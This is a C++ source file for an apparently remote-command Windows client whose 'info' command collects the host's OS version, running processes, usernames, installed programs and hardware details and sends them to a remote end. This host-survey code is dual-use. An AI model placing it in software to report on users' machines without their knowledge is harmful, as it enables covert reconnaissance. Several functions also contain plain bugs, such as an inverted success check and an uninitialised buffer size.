#include "stdafx.h"
#include "Command_info.h"

#include "Settings.h"
#include "Logger.h"
#include "Util.h"
#include "Network.h"

#include <TlHelp32.h>

// Used to convert bytes to MB
#define DIV 1048576

#define SAFE_RELEASE(p) if(p) { p->Release(); p = NULL; }

DWORD Command_info::dwLastProcessTime = 0;
DWORD Command_info::dwLastSystemTime = 0;
double Command_info::dCPULoad = 0.0;

Command_info::Command_info()
{
	std::wstring dummy;
	HRESULT hr;

	GetCPULoad(dummy);

	hr = CoInitializeEx(0, COINIT_MULTITHREADED);
	if(FAILED(hr)) {
		VLog(LERROR, L"Failed to initialize COM");
	}
}

Command_info::~Command_info()
{
	CoUninitialize();
}

bool Command_info::OnExecute(const std::vector<std::wstring> &args)
{
	std::wstring info = L"i=";

	GetInformation(info);
	network.SendTextW(V_NET_FILE_DATA, info.c_str());
	return true;
}

void Command_info::GetInformation(std::wstring& str)
{
	str += L"osVer:";
	this->GetOSVersion(str);
	str += L"\n";

	str += L"procs:";
	this->EnumerateProcesses(str);
	str += L"\n";

	str += L"hostname:";
	this->GetHostname(str);
	str += L"\n";

	str += L"time:";
	this->GetTime(str);
	str += L"\n";

	str += L"memory-usage:";
	this->GetMemoryStatus(str);
	str += L"\n";

	str += L"cpu-usage:";
	this->GetCPULoad(str);
	str += L"\n";

	str += L"name-real:";
	this->GetUsernameReal(str);
	str += L"\n";

	str += L"name-login:";
	this->GetUsernameLogin(str);
	str += L"\n";

	str += L"programs:";
	this->GetProgramList(str);
	str += L"\n";

	str += L"cpu:";
	this->GetCPUInfo(str);
	str += L"\n";

	str += L"ram:";
	this->GetRAMInfo(str);
	str += L"\n";

	str += L"display:";
	this->GetDisplayDeviceInfo(str);
	str += L"\n";

	str += L"audio:";
	this->GetAudioDeviceInfo(str);
	str += L"\n";
}

bool Command_info::GetOSVersion(std::wstring& str)
{
	OSVERSIONINFO osVersionInfo;

	ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFO));
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	// TODO: this function is deprecated since Windows 8?
	GetVersionEx(&osVersionInfo);

	str += std::to_wstring(osVersionInfo.dwMajorVersion);
	str += L".";
	str += std::to_wstring(osVersionInfo.dwMinorVersion);
	str += L".";
	str += std::to_wstring(osVersionInfo.dwBuildNumber);

	return true;
}
bool Command_info::GetProcessInfoStr(DWORD processID, std::wstring& str)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE, processID);

	if(hProcess == NULL) {
		return false;
	}

	HMODULE hMod;
	DWORD bytesNeeded;

	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &bytesNeeded)) {
		wchar_t processName[MAX_PATH];
		if(GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(wchar_t))) {
			str += processName;
			return true;
		}
	}

	return false;
}

bool Command_info::EnumerateProcesses(std::wstring& str)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while(hRes)
	{
		if(GetProcessInfoStr(pEntry.th32ProcessID, str)) {
			str += L";";
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return false;
}

bool Command_info::GetHostname(std::wstring& str)
{
	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size;

	if(GetComputerName(buffer, &size) != 0) {
		str += std::wstring(buffer, size);
		return true;
	}
	else {
		str += L"unknown";
		return false;
	}
}

bool Command_info::GetTime(std::wstring &str)
{
	SYSTEMTIME sysTime;

	ZeroMemory(&sysTime, sizeof(SYSTEMTIME));
	GetLocalTime(&sysTime);

	str += std::to_wstring(sysTime.wDay);
	str += L".";
	str += std::to_wstring(sysTime.wMonth);
	str += L".",
		str += std::to_wstring(sysTime.wYear);
	str += L" ";
	str += std::to_wstring(sysTime.wHour);
	str += L":";
	str += std::to_wstring(sysTime.wMinute);
	str += L":";
	str += std::to_wstring(sysTime.wSecond);

	return true;
}

bool Command_info::GetMemoryStatus(std::wstring& str)
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	if(GlobalMemoryStatusEx(&statex)) {
		str += L"total:";
		str += std::to_wstring(statex.ullTotalPhys / DIV);
		str += L";";

		str += L"free:";
		str += std::to_wstring(statex.ullAvailPhys / DIV);
		str += L";";

		return true;
	}
	else {
		return false;
	}
}

bool Command_info::GetCPULoad(std::wstring& str)
{
	FILETIME ftCreationTime, ftExitTime, ftKernelTime, ftUserTime;
	ULARGE_INTEGER uiKernelTime, uiUserTime;

	GetProcessTimes(GetCurrentProcess(), &ftCreationTime, &ftExitTime, &ftKernelTime, &ftUserTime);

	uiKernelTime.HighPart = ftKernelTime.dwHighDateTime;
	uiKernelTime.LowPart = ftKernelTime.dwLowDateTime;
	uiUserTime.HighPart = ftUserTime.dwHighDateTime;
	uiUserTime.LowPart = ftUserTime.dwLowDateTime;

	DWORD dwActualProcessTime = (DWORD)((uiKernelTime.QuadPart + uiUserTime.QuadPart) / 100);
	DWORD dwActualSystemTime = GetTickCount();

	if(dwLastSystemTime) {
		dCPULoad = (double)(dwActualProcessTime - dwLastProcessTime) / (dwActualSystemTime - dwLastSystemTime);
	}
	dwLastProcessTime = dwActualProcessTime;
	dwLastSystemTime = dwActualSystemTime;

	str += std::to_wstring(dCPULoad);

	return true;
}

bool Command_info::GetUsernameReal(std::wstring& str)
{
	wchar_t buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserNameEx(NameDisplay, buffer, &size)) {
		str += std::wstring(buffer, size);
		return true;
	}
	else {
		str += L"unknown";
		return false;
	}
}

bool Command_info::GetUsernameLogin(std::wstring& str)
{
	wchar_t buffer[1024] = { 0 };
	ULONG size = sizeof(buffer);

	if(GetUserName(buffer, &size) == 0) {
		str += std::wstring(buffer, size);
		return true;
	}
	else {
		str += L"unknown";
		return false;
	}
}

bool Command_info::GetProgramList(std::wstring& str)
{
	HKEY hKey = { 0 };
	LPCTSTR path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
	HRESULT status;

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hKey);

	if(status != ERROR_SUCCESS) {
		return false;
	}

	DWORD index = 0;
	wchar_t keyName[256] = { 0 };
	DWORD keyLen = 256;

	while(RegEnumKeyEx(hKey, index++, keyName, &keyLen, 0, 0, 0, 0) == ERROR_SUCCESS) {
		keyLen = 256;

		HKEY hSubKey = { 0 };
		if(RegOpenKeyEx(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
			wchar_t dest[256];
			DWORD size = 256;

			status = RegQueryValueEx(hSubKey, L"DisplayName", NULL, NULL, (LPBYTE)dest, &size);
			if(status != ERROR_SUCCESS) {
				continue;
			}

			// ignore size?
			str += std::wstring(dest);
			str += L";";
		}
	}

	return true;
}

bool Command_info::GetCPUInfo(std::wstring &str)
{
	HKEY hKey = { 0 };
	LPCTSTR path = L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
	HRESULT status;

	status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_READ | KEY_WOW64_64KEY, &hKey);

	if(status != ERROR_SUCCESS) {
		return false;
	}

	wchar_t dest[256];
	DWORD size = 256;

	status = RegQueryValueEx(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)dest, &size);
	if(status != ERROR_SUCCESS) {
		return false;
	}

	str += std::wstring(dest);
	return true;
}

bool Command_info::GetRAMInfo(std::wstring &str)
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	if(GlobalMemoryStatusEx(&statex)) {
		str += L"ram:";
		str += std::to_wstring(statex.ullTotalPhys / DIV);
		str += L";";
	}

	return false;
}

bool Command_info::GetDisplayDeviceInfo(std::wstring &str)
{
	DISPLAY_DEVICE diDev;

	diDev.cb = sizeof(DISPLAY_DEVICE);

	if(EnumDisplayDevices(NULL, 0, &diDev, 0)) {
		str += diDev.DeviceString;
		return true;
	}

	return false;
}

bool Command_info::GetAudioDeviceInfo(std::wstring &str)
{
	bool ret = true;
	HRESULT hr = S_OK;
	IMMDeviceEnumerator *enumerator = NULL;
	IMMDevice *device = NULL;
	IPropertyStore *propStore = NULL;
	PROPVARIANT varName = { 0 };
	IMMDeviceCollection *collection = NULL;
	UINT count = 0;

	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void **)&enumerator);
	if(FAILED(hr)) {
		VLog(LERROR, L"GetAudioDeviceInfo: CoCreateInstance failed for IMMDeviceEnumerator");
		ret = false;
		goto clear;
	}

	hr = enumerator->EnumAudioEndpoints(eRender, DEVICE_STATE_ACTIVE, &collection);
	if(FAILED(hr)) {
		VLog(LERROR, L"GetAudioDeviceInfo: EnumAudioEndpoints failed");
		ret = false;
		goto clear;
	}

	hr = collection->GetCount(&count);
	if(FAILED(hr)) {
		VLog(LERROR, L"GetAudioDeviceInfo: GetCount failed");
		ret = false;
		goto clear;
	}

	for(ULONG i = 0; i < count; i++) {
		hr = collection->Item(i, &device);
		if(FAILED(hr)) {
			VLog(LERROR, L"GetAudioDeviceInfo: Item failed");
			ret = false;
			goto clear;
		}

		hr = device->OpenPropertyStore(STGM_READ, &propStore);
		if(FAILED(hr)) {
			VLog(LERROR, L"GetAudioDeviceInfo: OpenPropertyStore failed");
			ret = false;
			goto clear;
		}

		PropVariantInit(&varName);

		hr = propStore->GetValue(PKEY_DeviceInterface_FriendlyName, &varName);
		if(FAILED(hr)) {
			VLog(LERROR, L"GetAudioDeviceInfo: GetValue failed");
			ret = false;
			goto clear;
		}

		str += varName.pwszVal;
		str += L";";

		PropVariantClear(&varName);
		SAFE_RELEASE(propStore);
		SAFE_RELEASE(device);
	}

clear:
	PropVariantClear(&varName);
	SAFE_RELEASE(propStore);
	SAFE_RELEASE(device);
	SAFE_RELEASE(collection);
	SAFE_RELEASE(enumerator);

	return ret;
}